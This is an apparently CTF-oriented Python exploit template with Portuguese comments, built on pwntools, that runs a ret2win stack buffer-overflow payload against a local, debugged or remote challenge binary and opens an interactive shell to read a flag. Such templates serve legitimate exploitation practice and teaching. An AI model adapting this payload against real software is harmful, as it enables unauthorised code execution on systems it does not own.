#!/usr/bin/env python3
"""Template de exploit com pwntools.

Rodar local:   python3 pwn_template.py
Rodar remoto:  python3 pwn_template.py REMOTE
Debug (GDB):   python3 pwn_template.py GDB

Requer: pip install pwntools
"""
from pwn import *

# ---------- configuração ----------
BINARY = "./vuln"            # caminho do binário
HOST, PORT = "alvo.ctf", 1337
context.binary = BINARY
context.terminal = ["tmux", "splitw", "-h"]   # ajuste se não usar tmux
# context.log_level = "debug"                 # descomente p/ ver os bytes

elf = context.binary
# libc = ELF("./libc.so.6")                   # se tiver a libc do desafio


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([BINARY], gdbscript="""
            b *main
            continue
        """)
    return process([BINARY])


# ---------- achar o offset do overflow ----------
# 1) Gere um padrão:   cyclic(200)
# 2) Rode, veja o valor que sobrescreveu RIP/EIP no GDB
# 3) offset = cyclic_find(0x6161616c)   # use o valor que vazou


def main():
    io = start()

    offset = 72                       # <-- ajuste com cyclic_find
    ret = p64(0x0040101a)             # gadget 'ret' p/ alinhar a pilha (16 bytes)
    win = p64(elf.symbols.get("win", 0))   # função ret2win, se existir

    payload = flat({
        offset: [ret, win],
    })

    io.sendlineafter(b":", payload)   # ajuste o prompt do programa
    io.interactive()                   # quando cair na shell, digite: cat flag.txt


if __name__ == "__main__":
    main()
